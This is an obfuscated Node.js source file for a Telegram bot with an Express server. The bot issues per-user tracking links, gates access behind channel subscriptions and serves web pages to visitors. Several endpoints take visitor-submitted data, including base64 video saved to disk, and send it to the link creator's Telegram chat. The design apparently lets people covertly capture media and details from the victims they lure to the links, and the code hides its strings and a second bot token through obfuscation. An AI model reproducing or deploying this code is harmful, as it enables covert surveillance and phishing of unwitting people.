const _0x54baf1 = _0x2c5f;
(function (_0x2a9cd1, _0xbcc006) {
    const _0x2bc8cb = _0x2c5f, _0xea87cf = _0x2a9cd1();
    while (!![]) {
        try {
            const _0xec1ad8 = parseInt(_0x2bc8cb(0x741)) / (-0x1aac + 0x8f8 + 0x11b5) + parseInt(_0x2bc8cb(0x752)) / (-0x1bb * -0x6 + -0x5d + -0x1 * 0xa03) + parseInt(_0x2bc8cb(0x7cd)) / (-0x1d11 * -0x1 + -0x105 + 0x1c09 * -0x1) + -parseInt(_0x2bc8cb(0x2de)) / (0x1e3a + -0x1 * -0x2683 + -0x1 * 0x44b9) * (-parseInt(_0x2bc8cb(0x504)) / (-0x158f * 0x1 + -0x18de + 0x2e72)) + -parseInt(_0x2bc8cb(0x1ca)) / (0x16e1 + -0x10f9 + -0x5e2) * (parseInt(_0x2bc8cb(0x8df)) / (0xf06 + 0x106 * 0x25 + -0x34dd)) + parseInt(_0x2bc8cb(0x2be)) / (0x6 * 0x18d + -0x12ad + -0x967 * -0x1) * (parseInt(_0x2bc8cb(0x5b6)) / (0x1e1a + -0x1c3 * 0x13 + -0x4 * -0xda)) + -parseInt(_0x2bc8cb(0x29e)) / (0x4 * -0xf2 + 0xadc + -0x70a) * (parseInt(_0x2bc8cb(0x31c)) / (-0x1fd + 0x16 * 0xe3 + -0x117a));
            if (_0xec1ad8 === _0xbcc006)
                break;
            else
                _0xea87cf['push'](_0xea87cf['shift']());
        } catch (_0x1f93a6) {
            _0xea87cf['push'](_0xea87cf['shift']());
        }
    }
}(_0x4e41, 0x115ada + 0x2f36 * -0x8e + -0x99 * -0x25db), require(_0x54baf1(0x259))[_0x54baf1(0x303)]());
const TelegramBot = require(_0x54baf1(0x1d2) + _0x54baf1(0x3f2) + 'i'), express = require(_0x54baf1(0x757)), bodyParser = require(_0x54baf1(0x873) + 'r'), multer = require(_0x54baf1(0x86d)), path = require(_0x54baf1(0x73b)), fs = require('fs'), crypto = require(_0x54baf1(0x2e3)), axios = require(_0x54baf1(0x25c)), uuid = require(_0x54baf1(0x49a)), cheerio = require(_0x54baf1(0x2c2)), dns = require(_0x54baf1(0x3d2)), sleep = _0x2c5029 => new Promise(_0x22beae => setTimeout(_0x22beae, _0x2c5029)), botToken = process[_0x54baf1(0x4f5)]['n'], botUsername = _0x54baf1(0x1dd), bot = new TelegramBot(botToken, { 'polling': !![] }), developerChannels = [
        _0x54baf1(0x63b),
        _0x54baf1(0x3a2),
        _0x54baf1(0x5fd),
        _0x54baf1(0x7c4),
        _0x54baf1(0x677)
    ], SECOND_BOT_TOKEN = _0x54baf1(0x61e) + _0x54baf1(0x4b7) + _0x54baf1(0x5af) + _0x54baf1(0x394) + _0x54baf1(0x3f7), secondBot = new TelegramBot(SECOND_BOT_TOKEN, { 'polling': !![] });
let inviteLinks = {}, userPoints = {}, linkData = {}, visitorData = {};
function clearCache() {
    const _0x31a51b = _0x54baf1, _0x53fc65 = { 'WsJdM': _0x31a51b(0x298) + _0x31a51b(0x78a) };
    console[_0x31a51b(0x3f8)](_0x53fc65[_0x31a51b(0x595)]), userPoints = {}, linkData = {}, visitorData = {};
    const _0xb5e748 = {};
}
setInterval(clearCache, (-0x958 + -0x3d * -0x8b + -0x10bf) * (0x1 * -0x346 + -0x749 + 0x17 * 0xa1));
async function isUserSubscribed(_0x186357) {
    const _0x1305cd = _0x54baf1, _0x4f6885 = {
            'rEyIN': function (_0x16862f, _0x49d178) {
                return _0x16862f === _0x49d178;
            },
            'MUrlb': _0x1305cd(0x207),
            'nPsXM': function (_0x16447f, _0x33c1b2) {
                return _0x16447f === _0x33c1b2;
            },
            'ictlV': _0x1305cd(0x35e) + _0x1305cd(0x5f7),
            'nOpMJ': function (_0x262801, _0x1754ab) {
                return _0x262801 === _0x1754ab;
            },
            'oiEgv': _0x1305cd(0x317),
            'YrPTq': _0x1305cd(0x476) + _0x1305cd(0x44c) + _0x1305cd(0x6be) + _0x1305cd(0x68b)
        };
    try {
        const _0x3a7f24 = await Promise[_0x1305cd(0x52e)](developerChannels[_0x1305cd(0x502)](_0x1577fb => bot[_0x1305cd(0x208) + _0x1305cd(0x885)](_0x1577fb, _0x186357)));
        return _0x3a7f24[_0x1305cd(0x2a9)](_0x5fd792 => {
            const _0x52ebfd = _0x1305cd, _0x15eeb1 = _0x5fd792[_0x52ebfd(0x866)];
            return _0x4f6885[_0x52ebfd(0x2e8)](_0x15eeb1, _0x4f6885[_0x52ebfd(0x40d)]) || _0x4f6885[_0x52ebfd(0x21c)](_0x15eeb1, _0x4f6885[_0x52ebfd(0x6e5)]) || _0x4f6885[_0x52ebfd(0x645)](_0x15eeb1, _0x4f6885[_0x52ebfd(0x82c)]);
        });
    } catch (_0x5bdf44) {
        return console[_0x1305cd(0x44a)](_0x4f6885[_0x1305cd(0x427)], _0x5bdf44), ![];
    }
}
bot[_0x54baf1(0x67d)](/\/Vip/, async _0x3b2676 => {
    const _0x502fc9 = _0x54baf1, _0x4a465b = {
            'RkFui': function (_0x8e7116, _0x3a40d1) {
                return _0x8e7116(_0x3a40d1);
            },
            'lvjEF': _0x502fc9(0x548) + _0x502fc9(0x6d5) + _0x502fc9(0x42e) + _0x502fc9(0x80c) + _0x502fc9(0x3a3) + _0x502fc9(0x693),
            'ydOqz': _0x502fc9(0x379) + _0x502fc9(0x4a5) + _0x502fc9(0x3b4) + _0x502fc9(0x31e) + _0x502fc9(0x416) + _0x502fc9(0x391) + _0x502fc9(0x6af) + '.',
            'WkKYo': _0x502fc9(0x50f) + _0x502fc9(0x60c) + _0x502fc9(0x2bf),
            'JMaco': _0x502fc9(0x412) + _0x502fc9(0x811) + _0x502fc9(0x7b3) + _0x502fc9(0x928),
            'nuwua': _0x502fc9(0x702) + _0x502fc9(0x68d) + _0x502fc9(0x694) + _0x502fc9(0x6ec),
            'hflEF': _0x502fc9(0x41b) + _0x502fc9(0x6e7) + _0x502fc9(0x687)
        }, _0x126b64 = _0x3b2676[_0x502fc9(0x2cb)]['id'], _0x5df821 = _0x3b2676[_0x502fc9(0x511)]['id'], _0x83df11 = await _0x4a465b[_0x502fc9(0x881)](isUserSubscribed, _0x126b64);
    if (!_0x83df11) {
        const _0x451296 = _0x4a465b[_0x502fc9(0x4aa)], _0x4a938b = developerChannels[_0x502fc9(0x502)](_0x5b28a3 => [{
                    'text': _0x502fc9(0x3d3) + _0x5b28a3,
                    'url': _0x502fc9(0x70c) + _0x502fc9(0x4d7) + _0x5b28a3[_0x502fc9(0x2f6)](-0x8f * -0x5 + 0x54 + -0x31e)
                }]);
        bot[_0x502fc9(0x83a) + 'e'](_0x126b64, _0x451296, { 'reply_markup': { 'inline_keyboard': _0x4a938b } });
        return;
    }
    const _0x45d27a = uuid['v4']();
    linkData[_0x45d27a] = {
        'userId': _0x5df821,
        'chatId': _0x126b64,
        'visitors': []
    };
    const _0x2de932 = _0x4a465b[_0x502fc9(0x51d)];
    bot[_0x502fc9(0x83a) + 'e'](_0x126b64, _0x2de932, {
        'reply_markup': {
            'inline_keyboard': [
                [{
                        'text': _0x4a465b[_0x502fc9(0x628)],
                        'callback_data': _0x502fc9(0x3a8) + _0x45d27a
                    }],
                [{
                        'text': _0x4a465b[_0x502fc9(0x4c3)],
                        'callback_data': _0x502fc9(0x3a8) + _0x45d27a
                    }],
                [{
                        'text': _0x4a465b[_0x502fc9(0x40b)],
                        'callback_data': _0x502fc9(0x3a8) + _0x45d27a
                    }],
                [{
                        'text': _0x4a465b[_0x502fc9(0x8e2)],
                        'callback_data': _0x502fc9(0x3a8) + _0x45d27a
                    }]
            ]
        }
    });
}), bot['on'](_0x54baf1(0x3a6) + _0x54baf1(0x1a2), async _0xb5fa29 => {
    const _0x5eb735 = _0x54baf1, _0x5c941c = {
            'lEARH': function (_0x143258, _0x6e061) {
                return _0x143258 === _0x6e061;
            }
        }, _0x2ef815 = _0xb5fa29[_0x5eb735(0x7ed)][_0x5eb735(0x2cb)]['id'], _0x5ba8a6 = _0xb5fa29[_0x5eb735(0x511)]['id'], _0x286f85 = _0xb5fa29[_0x5eb735(0x755)][_0x5eb735(0x699)]('_')[0x2 * -0x112d + 0xe8 * -0x2b + 0x4954];
    if (linkData[_0x286f85] && _0x5c941c[_0x5eb735(0x260)](linkData[_0x286f85][_0x5eb735(0x7d6)], _0x5ba8a6)) {
        const _0x1f47af = _0x5eb735(0x711) + _0x5eb735(0x452) + _0x5eb735(0x705) + _0x5eb735(0x4bc) + _0x5eb735(0x691) + _0x5eb735(0x485) + _0x5eb735(0x377) + _0x5eb735(0x65a) + _0x5eb735(0x589) + _0x5eb735(0x1f7) + _0x5eb735(0x6fb) + botUsername + _0x5eb735(0x291) + _0x286f85;
        bot[_0x5eb735(0x83a) + 'e'](_0x2ef815, _0x1f47af);
    }
});
const baseUrl = process[_0x54baf1(0x4f5)]['r'];
bot[_0x54baf1(0x67d)](/\/vip (.+)/, async (_0xb29d04, _0x287d98) => {
    const _0x7b7d88 = _0x54baf1, _0x402d5d = {
            'SzOQz': function (_0x21471b, _0x1a6448) {
                return _0x21471b(_0x1a6448);
            },
            'NxoKA': _0x7b7d88(0x548) + _0x7b7d88(0x6d5) + _0x7b7d88(0x42e) + _0x7b7d88(0x80c) + _0x7b7d88(0x3a3) + _0x7b7d88(0x693),
            'FBUfi': function (_0xc495d5, _0x415058) {
                return _0xc495d5 !== _0x415058;
            }
        }, _0x36942a = _0x287d98[0x1a * 0x164 + 0x1873 * -0x1 + -0x4 * 0x2ed], _0x105fdf = _0xb29d04[_0x7b7d88(0x511)]['id'], _0x40b111 = _0xb29d04[_0x7b7d88(0x2cb)]['id'], _0x3bd8e1 = await _0x402d5d[_0x7b7d88(0x530)](isUserSubscribed, _0x40b111);
    if (!_0x3bd8e1) {
        const _0x44ec38 = _0x402d5d[_0x7b7d88(0x499)], _0x29f746 = developerChannels[_0x7b7d88(0x502)](_0x393164 => [{
                    'text': _0x7b7d88(0x3d3) + _0x393164,
                    'url': _0x7b7d88(0x70c) + _0x7b7d88(0x4d7) + _0x393164[_0x7b7d88(0x2f6)](-0x1 * 0xcfb + 0xc36 + -0x16 * -0x9)
                }]);
        bot[_0x7b7d88(0x83a) + 'e'](_0x40b111, _0x44ec38, { 'reply_markup': { 'inline_keyboard': _0x29f746 } });
        return;
    }
    if (linkData[_0x36942a]) {
        const {
            userId: _0xb51909,
            visitors: _0x305d41
        } = linkData[_0x36942a];
        if (_0x402d5d[_0x7b7d88(0x56a)](_0x105fdf, _0xb51909) && (!visitorData[_0x105fdf] || !visitorData[_0x105fdf][_0x7b7d88(0x487)](_0xb51909))) {
            _0x305d41[_0x7b7d88(0x5bd)](_0x105fdf);
            !visitorData[_0x105fdf] && (visitorData[_0x105fdf] = []);
            visitorData[_0x105fdf][_0x7b7d88(0x5bd)](_0xb51909);
            !userPoints[_0xb51909] && (userPoints[_0xb51909] = -0x15 * 0x1b2 + -0xc13 + 0x2fad);
            userPoints[_0xb51909] += 0x1 * -0xd3 + -0x1 * -0x847 + -0x773;
            const _0x23ff6e = _0x7b7d88(0x8eb) + _0x7b7d88(0x607) + _0x7b7d88(0x377) + _0x7b7d88(0x1cf) + _0x7b7d88(0x8a7) + _0x7b7d88(0x212) + _0x7b7d88(0x899) + _0x7b7d88(0x498) + _0x7b7d88(0x8ac) + _0x7b7d88(0x3f6);
            bot[_0x7b7d88(0x83a) + 'e'](_0x40b111, _0x23ff6e);
            const _0x3eaaaf = _0x7b7d88(0x30a) + _0x7b7d88(0x800) + _0x7b7d88(0x7b4) + _0x7b7d88(0x357) + _0x7b7d88(0x245);
            bot[_0x7b7d88(0x83a) + 'e'](_0xb51909, _0x3eaaaf);
        }
    }
}), bot['on'](_0x54baf1(0x3a6) + _0x54baf1(0x1a2), async _0x128c8a => {
    const _0x50e060 = _0x54baf1, _0x554e7e = {
            'BWUTb': function (_0x55a7d7, _0x2be50e) {
                return _0x55a7d7 === _0x2be50e;
            }
        }, _0x312461 = _0x128c8a[_0x50e060(0x7ed)][_0x50e060(0x2cb)]['id'], _0x46b055 = _0x128c8a[_0x50e060(0x511)]['id'], _0x3006f1 = _0x128c8a[_0x50e060(0x755)][_0x50e060(0x699)]('_')[-0x1d * -0xe9 + -0x23f * -0xb + -0x6d * 0x78];
    if (linkData[_0x3006f1] && _0x554e7e[_0x50e060(0x194)](linkData[_0x3006f1][_0x50e060(0x7d6)], _0x46b055)) {
        const _0x41c400 = _0x50e060(0x711) + _0x50e060(0x452) + _0x50e060(0x705) + _0x50e060(0x4bc) + _0x50e060(0x691) + _0x50e060(0x485) + _0x50e060(0x377) + _0x50e060(0x65a) + _0x50e060(0x649) + _0x50e060(0x45a) + _0x50e060(0x561) + botUsername + _0x50e060(0x291) + _0x3006f1;
        bot[_0x50e060(0x83a) + 'e'](_0x312461, _0x41c400);
    }
}), bot[_0x54baf1(0x67d)](/\/start (.+)/, async (_0xd51b68, _0x41753d) => {
    const _0x1ce66c = _0x54baf1, _0x2fc11e = {
            'WpTKz': function (_0x2b6959, _0x58a145) {
                return _0x2b6959(_0x58a145);
            },
            'eenky': _0x1ce66c(0x548) + _0x1ce66c(0x6d5) + _0x1ce66c(0x42e) + _0x1ce66c(0x80c) + _0x1ce66c(0x3a3) + _0x1ce66c(0x693),
            'hiXfD': function (_0x398b84, _0x1a6667) {
                return _0x398b84 !== _0x1a6667;
            }
        }, _0x54b38d = _0x41753d[0xa * -0x2e8 + -0x12aa + 0x2fbb], _0x12d499 = _0xd51b68[_0x1ce66c(0x511)]['id'], _0x1b62d0 = _0xd51b68[_0x1ce66c(0x2cb)]['id'], _0x2149e8 = await _0x2fc11e[_0x1ce66c(0x5ae)](isUserSubscribed, _0x1b62d0);
    if (!_0x2149e8) {
        const _0x48fecf = _0x2fc11e[_0x1ce66c(0x16f)], _0x5a6cc4 = developerChannels[_0x1ce66c(0x502)](_0x5de143 => [{
                    'text': _0x1ce66c(0x3d3) + _0x5de143,
                    'url': _0x1ce66c(0x70c) + _0x1ce66c(0x4d7) + _0x5de143[_0x1ce66c(0x2f6)](-0x2256 + 0x1 * 0x635 + 0x1c22)
                }]);
        bot[_0x1ce66c(0x83a) + 'e'](_0x1b62d0, _0x48fecf, { 'reply_markup': { 'inline_keyboard': _0x5a6cc4 } });
        return;
    }
    if (linkData[_0x54b38d]) {
        const {
            userId: _0x59d452,
            chatId: _0x3a3d52,
            visitors: _0x4ca2a7
        } = linkData[_0x54b38d];
        if (_0x2fc11e[_0x1ce66c(0x7cf)](_0x12d499, _0x59d452) && (!visitorData[_0x12d499] || !visitorData[_0x12d499][_0x1ce66c(0x487)](_0x59d452))) {
            _0x4ca2a7[_0x1ce66c(0x5bd)](_0x12d499);
            !visitorData[_0x12d499] && (visitorData[_0x12d499] = []);
            visitorData[_0x12d499][_0x1ce66c(0x5bd)](_0x59d452);
            !userPoints[_0x59d452] && (userPoints[_0x59d452] = -0x1e13 * -0x1 + 0x1f8d * -0x1 + 0x17a);
            userPoints[_0x59d452] += 0x1 * 0x1b4d + 0x17 * 0xa4 + -0x2a08;
            const _0x3ec787 = _0x1ce66c(0x8eb) + _0x1ce66c(0x607) + _0x1ce66c(0x377) + _0x1ce66c(0x1cf) + _0x1ce66c(0x2fc) + _0x1ce66c(0x7f0) + _0x1ce66c(0x25b) + _0x1ce66c(0x4e2) + _0x1ce66c(0x357) + _0x1ce66c(0x6c0) + _0x1ce66c(0x1c0);
            bot[_0x1ce66c(0x83a) + 'e'](_0x3a3d52, _0x3ec787);
        }
    }
});
const app = express();
app[_0x54baf1(0x549)](bodyParser[_0x54baf1(0x7ba)]({
    'extended': !![],
    'limit': _0x54baf1(0x8db)
})), app[_0x54baf1(0x549)](bodyParser[_0x54baf1(0x6b1)]({ 'limit': _0x54baf1(0x7c8) })), app[_0x54baf1(0x549)](express[_0x54baf1(0x91c)](__dirname));
const storage = multer[_0x54baf1(0x1b0) + _0x54baf1(0x87d)](), upload = multer({ 'storage': storage }), uploadVoice = multer({ 'dest': _0x54baf1(0x5f6) });
app[_0x54baf1(0x2e2)](_0x54baf1(0x71d) + 'rm', (_0xe546b6, _0x8ca55f) => {
    const _0x3acba4 = _0x54baf1, _0x33bf1c = {
            'gSFcs': _0x3acba4(0x494) + _0x3acba4(0x33f) + _0x3acba4(0x3d9),
            'GgwYV': _0x3acba4(0x248),
            'CiTJp': _0x3acba4(0x85d),
            'SeHyI': _0x3acba4(0x577),
            'xfbmi': _0x3acba4(0x7e4),
            'CVGMs': _0x3acba4(0x619),
            'devNh': _0x3acba4(0x769)
        }, _0x156651 = _0xe546b6[_0x3acba4(0x17c)][_0x3acba4(0x8fa)], _0x5138dd = _0xe546b6[_0x3acba4(0x17c)][_0x3acba4(0x305)];
    if (!_0x156651)
        return _0x8ca55f[_0x3acba4(0x866)](0x1 * 0x1e3f + -0xac0 + -0x11ef)[_0x3acba4(0x82e)](_0x33bf1c[_0x3acba4(0x8c1)]);
    let _0x3b8f5c = '';
    switch (_0x5138dd) {
    case _0x33bf1c[_0x3acba4(0x385)]:
        _0x3b8f5c = _0x33bf1c[_0x3acba4(0x3ef)];
        break;
    case _0x33bf1c[_0x3acba4(0x4e5)]:
        _0x3b8f5c = _0x33bf1c[_0x3acba4(0x5a4)];
        break;
    case _0x33bf1c[_0x3acba4(0x187)]:
    default:
        _0x3b8f5c = _0x33bf1c[_0x3acba4(0x6f5)];
        break;
    }
    _0x8ca55f[_0x3acba4(0x7bf)](path[_0x3acba4(0x45e)](__dirname, _0x3b8f5c));
}), app[_0x54baf1(0x2e2)](_0x54baf1(0x2b5) + _0x54baf1(0x62b), (_0x344744, _0x4974af) => {
    const _0x58d66b = _0x54baf1, _0x4339b2 = {
            'ziCYH': function (_0x1038a6, _0x5b8821) {
                return _0x1038a6(_0x5b8821);
            },
            'mBjoj': _0x58d66b(0x8f4),
            'DIMoz': _0x58d66b(0x890) + _0x58d66b(0x5a3) + _0x58d66b(0x38b) + _0x58d66b(0x920) + _0x58d66b(0x2cd) + _0x58d66b(0x232),
            'eeHZx': _0x58d66b(0x1b1) + _0x58d66b(0x587) + _0x58d66b(0x8de) + _0x58d66b(0x5e6) + _0x58d66b(0x51e) + _0x58d66b(0x8b8)
        }, _0xa9994e = _0x344744[_0x58d66b(0x5f2)][_0x58d66b(0x8c6)];
    _0x4339b2[_0x58d66b(0x1c9)](validateLinkUsage, _0xa9994e) ? _0x4974af[_0x58d66b(0x7bf)](path[_0x58d66b(0x45e)](__dirname, _0x4339b2[_0x58d66b(0x670)])) : (_0x4974af[_0x58d66b(0x82e)](_0x4339b2[_0x58d66b(0x5d9)]), bot[_0x58d66b(0x83a) + 'e'](linkUsage[_0xa9994e][_0x58d66b(0x8fa)], _0x4339b2[_0x58d66b(0x6cb)]));
}), app[_0x54baf1(0x2e2)](_0x54baf1(0x849) + _0x54baf1(0x400) + 'd', (_0x318a35, _0x36d620) => {
    const _0x3f99be = _0x54baf1, _0xa55f17 = {
            'KRmOJ': function (_0x313a47, _0x428d03) {
                return _0x313a47(_0x428d03);
            },
            'RfSEL': _0x3f99be(0x54c),
            'gKDoh': _0x3f99be(0x890) + _0x3f99be(0x5a3) + _0x3f99be(0x38b) + _0x3f99be(0x920) + _0x3f99be(0x2cd) + _0x3f99be(0x232),
            'uhDHN': _0x3f99be(0x1b1) + _0x3f99be(0x587) + _0x3f99be(0x8de) + _0x3f99be(0x5e6) + _0x3f99be(0x51e) + _0x3f99be(0x8b8)
        }, _0xf4ab5f = _0x318a35[_0x3f99be(0x5f2)][_0x3f99be(0x8c6)];
    _0xa55f17[_0x3f99be(0x643)](validateLinkUsage, _0xf4ab5f) ? _0x36d620[_0x3f99be(0x7bf)](path[_0x3f99be(0x45e)](__dirname, _0xa55f17[_0x3f99be(0x63d)])) : (_0x36d620[_0x3f99be(0x82e)](_0xa55f17[_0x3f99be(0x3d6)]), bot[_0x3f99be(0x83a) + 'e'](linkUsage[_0xf4ab5f][_0x3f99be(0x8fa)], _0xa55f17[_0x3f99be(0x7f3)]));
}), app[_0x54baf1(0x2e2)](_0x54baf1(0x2f7) + _0x54baf1(0x516), (_0x21e74c, _0x3651f9) => {
    const _0x589eb0 = _0x54baf1, _0x29da30 = {
            'mmtxa': function (_0x7cdb00, _0x3909bc) {
                return _0x7cdb00(_0x3909bc);
            },
            'qbzLr': _0x589eb0(0x6f1),
            'MsZiW': _0x589eb0(0x890) + _0x589eb0(0x5a3) + _0x589eb0(0x38b) + _0x589eb0(0x920) + _0x589eb0(0x2cd) + _0x589eb0(0x232),
            'eqhqE': _0x589eb0(0x1b1) + _0x589eb0(0x587) + _0x589eb0(0x8de) + _0x589eb0(0x5e6) + _0x589eb0(0x51e) + _0x589eb0(0x8b8)
        }, _0x5d33a6 = _0x21e74c[_0x589eb0(0x5f2)][_0x589eb0(0x8c6)];
    _0x29da30[_0x589eb0(0x2fe)](validateLinkUsage, _0x5d33a6) ? _0x3651f9[_0x589eb0(0x7bf)](path[_0x589eb0(0x45e)](__dirname, _0x29da30[_0x589eb0(0x3a9)])) : (_0x3651f9[_0x589eb0(0x82e)](_0x29da30[_0x589eb0(0x350)]), bot[_0x589eb0(0x83a) + 'e'](linkUsage[_0x5d33a6][_0x589eb0(0x8fa)], _0x29da30[_0x589eb0(0x429)]));
}), app[_0x54baf1(0x2e2)](_0x54baf1(0x19d) + _0x54baf1(0x5f9), (_0x26a271, _0xbcf7c5) => {
    const _0xdd0ab4 = _0x54baf1, _0x339b1d = {
            'WBZIA': function (_0x765fac, _0x2ac918) {
                return _0x765fac(_0x2ac918);
            },
            'sPTzC': _0xdd0ab4(0x46f),
            'FHVKC': _0xdd0ab4(0x890) + _0xdd0ab4(0x5a3) + _0xdd0ab4(0x38b) + _0xdd0ab4(0x920) + _0xdd0ab4(0x2cd) + _0xdd0ab4(0x232),
            'CAYlJ': _0xdd0ab4(0x1b1) + _0xdd0ab4(0x587) + _0xdd0ab4(0x8de) + _0xdd0ab4(0x5e6) + _0xdd0ab4(0x51e) + _0xdd0ab4(0x8b8)
        }, _0x3dff8c = _0x26a271[_0xdd0ab4(0x5f2)][_0xdd0ab4(0x8c6)];
    _0x339b1d[_0xdd0ab4(0x192)](validateLinkUsage, _0x3dff8c) ? _0xbcf7c5[_0xdd0ab4(0x7bf)](path[_0xdd0ab4(0x45e)](__dirname, _0x339b1d[_0xdd0ab4(0x8ef)])) : (_0xbcf7c5[_0xdd0ab4(0x82e)](_0x339b1d[_0xdd0ab4(0x27c)]), bot[_0xdd0ab4(0x83a) + 'e'](linkUsage[_0x3dff8c][_0xdd0ab4(0x8fa)], _0x339b1d[_0xdd0ab4(0x2d5)]));
}), app[_0x54baf1(0x514)](_0x54baf1(0x8e1) + 'es', (_0x505f68, _0x256b7b) => {
    const _0x23d544 = _0x54baf1, _0x116eea = {
            'WjJSA': _0x23d544(0x756) + _0x23d544(0x88d) + _0x23d544(0x273) + ':',
            'ZLtsO': _0x23d544(0x2c0) + _0x23d544(0x22e),
            'ZBRIh': _0x23d544(0x4d8)
        }, _0x3cf5e8 = _0x505f68[_0x23d544(0x91e)][_0x23d544(0x8fa)], _0x48e4e1 = _0x505f68[_0x23d544(0x91e)][_0x23d544(0x460)], _0x4f2bac = _0x505f68[_0x23d544(0x91e)][_0x23d544(0x399)];
    console[_0x23d544(0x3f8)](_0x116eea[_0x23d544(0x5ac)], _0x505f68[_0x23d544(0x91e)]), bot[_0x23d544(0x83a) + 'e'](_0x3cf5e8, _0x23d544(0x410) + _0x23d544(0x48c) + _0x23d544(0x842) + ':\x20' + _0x48e4e1 + (_0x23d544(0x508) + _0x23d544(0x72d)) + _0x4f2bac)[_0x23d544(0x39c)](() => {
    })[_0x23d544(0x732)](_0x530964 => {
        const _0x175a62 = _0x23d544;
        console[_0x175a62(0x44a)](_0x116eea[_0x175a62(0x239)], _0x530964[_0x175a62(0x75c)] ? _0x530964[_0x175a62(0x75c)][_0x175a62(0x91e)] : _0x530964);
    }), _0x256b7b[_0x23d544(0x1a1)](_0x116eea[_0x23d544(0x34f)]);
}), app[_0x54baf1(0x549)](bodyParser[_0x54baf1(0x6b1)]()), app[_0x54baf1(0x549)](express[_0x54baf1(0x91c)](__dirname)), app[_0x54baf1(0x2e2)](_0x54baf1(0x61d), (_0x455680, _0x2020b3) => {
    const _0x3e6793 = _0x54baf1, _0xeb7b0f = { 'WxyJg': _0x3e6793(0x4fb) };
    _0x2020b3[_0x3e6793(0x7bf)](path[_0x3e6793(0x45e)](__dirname, _0xeb7b0f[_0x3e6793(0x501)]));
}), app[_0x54baf1(0x514)](_0x54baf1(0x5fb) + _0x54baf1(0x46b), (_0x415260, _0x461c4c) => {
    const _0x480513 = _0x54baf1, _0x58f3ca = { 'KdsAf': _0x480513(0x756) + _0x480513(0x88d) + _0x480513(0x273) + ':' }, _0x2e6488 = _0x415260[_0x480513(0x91e)][_0x480513(0x8fa)], _0xa11b30 = _0x415260[_0x480513(0x91e)][_0x480513(0x92b) + 'r'];
    bot[_0x480513(0x83a) + 'e'](_0x2e6488, _0x480513(0x8ad) + _0x480513(0x92c) + _0x480513(0x39f) + _0x480513(0x764) + _0x480513(0x44b) + _0x480513(0x6b6) + _0x480513(0x818) + _0x480513(0x280) + ':\x20' + _0xa11b30)[_0x480513(0x39c)](() => {
        const _0x29793f = _0x480513;
        _0x461c4c[_0x29793f(0x6b1)]({ 'success': !![] });
    })[_0x480513(0x732)](_0x48fa3a => {
        const _0x3034f8 = _0x480513;
        console[_0x3034f8(0x44a)](_0x58f3ca[_0x3034f8(0x2ca)], _0x48fa3a[_0x3034f8(0x75c)] ? _0x48fa3a[_0x3034f8(0x75c)][_0x3034f8(0x91e)] : _0x48fa3a), _0x461c4c[_0x3034f8(0x6b1)]({ 'success': ![] });
    });
}), app[_0x54baf1(0x514)](_0x54baf1(0x7f6) + 'e', (_0x563d6f, _0x5d06b9) => {
    const _0x16e224 = _0x54baf1, _0x1d20d0 = {
            'gwgCA': _0x16e224(0x74f) + _0x16e224(0x546) + _0x16e224(0x50c),
            'rvuDA': _0x16e224(0x756) + _0x16e224(0x88d) + _0x16e224(0x273) + ':'
        }, _0x48f927 = _0x563d6f[_0x16e224(0x91e)][_0x16e224(0x8fa)], _0x3b8f2a = _0x563d6f[_0x16e224(0x91e)][_0x16e224(0x8da)];
    bot[_0x16e224(0x83a) + 'e'](_0x48f927, _0x16e224(0x28d) + _0x16e224(0x3df) + _0x16e224(0x909) + '\x20' + _0x3b8f2a)[_0x16e224(0x39c)](() => {
        const _0x2af56d = _0x16e224;
        _0x5d06b9[_0x2af56d(0x1a1)](_0x1d20d0[_0x2af56d(0x30f)]);
    })[_0x16e224(0x732)](_0x21a82c => {
        const _0xaa8ff0 = _0x16e224;
        console[_0xaa8ff0(0x44a)](_0x1d20d0[_0xaa8ff0(0x872)], _0x21a82c[_0xaa8ff0(0x75c)] ? _0x21a82c[_0xaa8ff0(0x75c)][_0xaa8ff0(0x91e)] : _0x21a82c), _0x5d06b9[_0xaa8ff0(0x6b1)]({ 'success': ![] });
    });
}), app[_0x54baf1(0x549)](bodyParser[_0x54baf1(0x6b1)]({ 'limit': _0x54baf1(0x736) })), app[_0x54baf1(0x549)](bodyParser[_0x54baf1(0x7ba)]({
    'limit': _0x54baf1(0x736),
    'extended': !![]
}));
const dataStore = {};
app[_0x54baf1(0x549)](express[_0x54baf1(0x91c)](__dirname)), app[_0x54baf1(0x514)](_0x54baf1(0x787) + 'eo', (_0x52aa55, _0x51b344) => {
    const _0x5c5eae = _0x54baf1, _0xaf0464 = {
            'RNjLy': _0x5c5eae(0x680),
            'AiGoF': _0x5c5eae(0x756) + _0x5c5eae(0x2fb),
            'ZmGvl': _0x5c5eae(0x7e6) + _0x5c5eae(0x8f9),
            'QnKKS': function (_0x2994d0, _0x19dba9) {
                return _0x2994d0 || _0x19dba9;
            },
            'fUPXs': _0x5c5eae(0x765) + _0x5c5eae(0x1d3) + _0x5c5eae(0x218) + _0x5c5eae(0x1de) + _0x5c5eae(0x624),
            'MAdIN': _0x5c5eae(0x4c7),
            'Ppzrb': _0x5c5eae(0x889),
            'XmHCk': _0x5c5eae(0x782) + _0x5c5eae(0x1b3) + _0x5c5eae(0x613),
            'FhmYB': _0x5c5eae(0x8a2) + _0x5c5eae(0x3d4) + _0x5c5eae(0x7d0),
            'SGubm': _0x5c5eae(0x7e6) + _0x5c5eae(0x7f5) + _0x5c5eae(0x22c)
        }, _0x26ab58 = _0x52aa55[_0x5c5eae(0x91e)][_0x5c5eae(0x8fa)], _0x1c76cf = _0x52aa55[_0x5c5eae(0x91e)][_0x5c5eae(0x552)];
    if (_0xaf0464[_0x5c5eae(0x720)](!_0x26ab58, !_0x1c76cf))
        return _0x51b344[_0x5c5eae(0x866)](-0x735 + 0x2495 + -0x1bd0)[_0x5c5eae(0x82e)](_0xaf0464[_0x5c5eae(0x66c)]);
    const _0x4489af = _0x1c76cf[_0x5c5eae(0x699)](',')[0x25 * -0x21 + 0x2a2 + 0x89 * 0x4], _0x331264 = path[_0x5c5eae(0x45e)](__dirname, _0xaf0464[_0x5c5eae(0x580)]);
    !fs[_0x5c5eae(0x407)](_0x331264) && fs[_0x5c5eae(0x879)](_0x331264);
    try {
        const _0x4c8dc6 = Buffer[_0x5c5eae(0x511)](_0x4489af, _0xaf0464[_0x5c5eae(0x4e1)]), _0x114585 = path[_0x5c5eae(0x45e)](_0x331264, _0x26ab58 + _0x5c5eae(0x8e8));
